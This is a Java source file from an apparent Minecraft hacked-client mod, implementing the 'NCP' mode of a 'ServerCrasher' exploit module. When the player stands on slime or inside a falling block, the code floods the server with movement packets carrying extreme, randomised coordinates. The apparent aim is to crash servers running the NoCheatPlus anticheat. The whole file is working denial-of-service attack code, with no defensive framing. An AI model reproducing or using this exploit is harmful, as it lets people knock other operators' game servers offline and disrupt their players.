package de.vandalismdevelopment.vandalism.feature.impl.module.impl.exploit.modes.servercrasher;

import de.florianmichael.dietrichevents2.DietrichEvents2;
import de.vandalismdevelopment.vandalism.event.TickListener;
import de.vandalismdevelopment.vandalism.feature.impl.module.ModuleMode;
import de.vandalismdevelopment.vandalism.feature.impl.module.impl.exploit.ServerCrasherModule;
import de.vandalismdevelopment.vandalism.value.Value;
import de.vandalismdevelopment.vandalism.value.values.number.slider.SliderIntegerValue;
import net.minecraft.block.SlimeBlock;
import net.minecraft.entity.Entity;
import net.minecraft.entity.FallingBlockEntity;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

import java.util.Random;
import java.util.concurrent.ThreadLocalRandom;

public class NCPModuleMode extends ModuleMode<ServerCrasherModule> implements TickListener {

    private final Value<Integer> speed = new SliderIntegerValue(
            "Speed",
            "The speed of the ncp crasher.",
            this.getParent(),
            10,
            1,
            100
    ).visibleConsumer(() -> this.getParent().mode.getSelectedMode().equals(this));

    public NCPModuleMode(final ServerCrasherModule parent) {
        super("NCP", parent);
    }

    @Override
    public void onEnable() {
        DietrichEvents2.global().subscribe(TickEvent.ID, this);
    }

    @Override
    public void onDisable() {
        DietrichEvents2.global().unsubscribe(TickEvent.ID, this);
    }

    @Override
    public void onTick() {
        if (world() == null || player() == null || networkHandler() == null) {
            this.getParent().setState(false);
            return;
        }
        boolean insideFallingBlock = false;
        for (final Entity entity : world().getEntities()) {
            if (entity instanceof FallingBlockEntity && entity.distanceTo(player()) <= 1) {
                insideFallingBlock = true;
                break;
            }
        }
        if (insideFallingBlock || (world().getBlockState(player().getBlockPos().down()).getBlock() instanceof SlimeBlock)) {
            for (int i = 0; i < this.speed.getValue(); i++) {
                for (int j = 0; j < 7; j++) {
                    final Random random = ThreadLocalRandom.current();
                    double newX = random.nextDouble(1.7E7, 2.0E7), newZ = random.nextDouble(1.7E7, 2.0E7);
                    if (j % 2 == 0) {
                        newX = -newX;
                        newZ = -newZ;
                    }
                    networkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                            newX,
                            -3.0E7,
                            newZ,
                            true
                    ));
                }
            }
            this.getParent().setState(false);
        }
    }

}
